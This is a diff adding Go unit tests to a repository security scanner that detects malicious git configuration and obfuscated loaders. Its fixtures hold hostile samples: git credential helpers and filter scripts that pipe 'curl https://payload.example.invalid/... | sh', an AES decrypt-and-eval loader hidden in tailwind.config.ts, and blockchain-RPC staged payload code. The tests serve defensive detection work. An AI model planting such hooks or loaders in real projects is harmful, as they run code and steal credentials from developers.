@@ -376,3 +376,138 @@ func TestFalsePositiveTuning(t *testing.T) {
 		}
 	})
 }
+
+func TestZelarioAndEtherHidingRules(t *testing.T) {
+	t.Run("GIT-003 detects filters, diff drivers, askPass, include, and ignores standard credential helpers", func(t *testing.T) {
+		files := []model.FileEntry{{
+			Path: ".git/config",
+			Content: []byte(`[core]
+	repositoryformatversion = 0
+	askPass = ./scripts/steal-pass.sh
+[filter "ltr"]
+	clean = .git/ltr
+	smudge = .git/smudge
+	process = ./scripts/proc.sh
+[diff]
+	external = ./scripts/diff.sh
+[credential]
+	helper = manager-core
+[credential "https://example.invalid"]
+	helper = !curl https://payload.example.invalid/cred | sh
+[alias]
+	co = !sh -c 'echo pwned'
+[include]
+	path = .git/hidden.cfg
+`),
+		}}
+
+		res := scanner.Scan("git-config-v2", "local", files, 0)
+		git003 := 0
+		hasFilter := false
+		for _, f := range res.Findings {
+			if f.RuleID == "GIT-003" {
+				git003++
+				if strings.Contains(f.Title, "Git Filter Auto-Execution") {
+					hasFilter = true
+				}
+				if strings.Contains(f.Snippet, "manager-core") {
+					t.Fatalf("standard credential helper manager-core should not trigger: %+v", f)
+				}
+			}
+		}
+		if git003 != 8 || !hasFilter {
+			t.Fatalf("expected 8 GIT-003 findings (including filter), got %d (%+v)", git003, res.Findings)
+		}
+	})
+
+	t.Run("GIT-004 detects .git/info/attributes filters and unexpected .git/ltr while ignoring benign .gitattributes", func(t *testing.T) {
+		benign := []model.FileEntry{{
+			Path:    ".gitattributes",
+			Content: []byte("* text=auto eol=lf\n*.png binary\n*.bin filter=lfs diff=lfs merge=lfs -text\n*.py diff=python\n"),
+		}}
+		if res := scanner.Scan("benign-attrs", "local", benign, 0); len(res.Findings) != 0 {
+			t.Fatalf("expected 0 findings on standard .gitattributes + lfs, got %+v", res.Findings)
+		}
+
+		mal := []model.FileEntry{
+			{
+				Path:    ".git/info/attributes",
+				Content: []byte("* filter=ltr\n"),
+			},
+			{
+				Path:    ".gitattributes",
+				Content: []byte("* filter=customdrv\n*.dat diff=mycustom\n"),
+			},
+			{
+				Path:    ".git/ltr",
+				Content: []byte("#!/bin/sh\ncurl -s https://payload.example.invalid/init.sh | sh\n"),
+			},
+		}
+		res := scanner.Scan("mal-git-attrs", "local", mal, 0)
+		git004Crit := 0
+		git004Total := 0
+		for _, f := range res.Findings {
+			if f.RuleID == "GIT-004" {
+				git004Total++
+				if f.Severity == model.SeverityCritical {
+					git004Crit++
+				}
+			}
+		}
+		if git004Crit < 2 || git004Total < 4 {
+			t.Fatalf("expected >=2 CRITICAL and >=4 total GIT-004 findings, got crit=%d total=%d (%+v)", git004Crit, git004Total, res.Findings)
+		}
+	})
+
+	t.Run("OBF-003 and OBF-004 detect AES decrypt+eval loaders, tailwind.config.ts, and EtherHiding", func(t *testing.T) {
+		files := []model.FileEntry{
+			{
+				Path: "tailwind.config.ts",
+				Content: []byte(`import crypto from "node:crypto";
+const d = crypto.createDecipheriv("aes-256-gcm", key, iv);
+eval(d.update(enc, "hex", "utf8") + d.final("utf8"));
+`),
+			},
+			{
+				Path: "scripts/main.js",
+				Content: []byte(`const rpcs = ["https://polygon-rpc.com", "https://polygon-bor-rpc.publicnode.com"];
+const payload = { jsonrpc: "2.0", method: "eth_call", params: [] };
+new Function(decodedStage2)();
+`),
+			},
+			{
+				Path: "scripts/multi_rpc_only.mjs",
+				Content: []byte(`const endpoints = ["https://polygon-rpc.com", "https://bsc-dataseed1.binance.org"];
+const req = { method: "eth_getStorageAt" };
+`),
+			},
+			{
+				Path: "scripts/benign_web3.js",
+				Content: []byte(`const res = await provider.send("eth_call", [{ to: addr, data }]);
+console.log(res);
+`),
+			},
+		}
+
+		res := scanner.Scan("etherhiding", "local", files, 0)
+		var obf003, obf004Crit, obf004High int
+		for _, f := range res.Findings {
+			if f.File == "scripts/benign_web3.js" {
+				t.Fatalf("benign web3 eth_call without eval or multi-RPC should not trigger: %+v", f)
+			}
+			switch f.RuleID {
+			case "OBF-003":
+				obf003++
+			case "OBF-004":
+				if f.Severity == model.SeverityCritical {
+					obf004Crit++
+				} else if f.Severity == model.SeverityHigh {
+					obf004High++
+				}
+			}
+		}
+		if obf003 != 1 || obf004Crit != 1 || obf004High != 1 {
+			t.Fatalf("unexpected OBF-003/004 counts: obf003=%d obf004Crit=%d obf004High=%d (%+v)", obf003, obf004Crit, obf004High, res.Findings)
+		}
+	})
+}
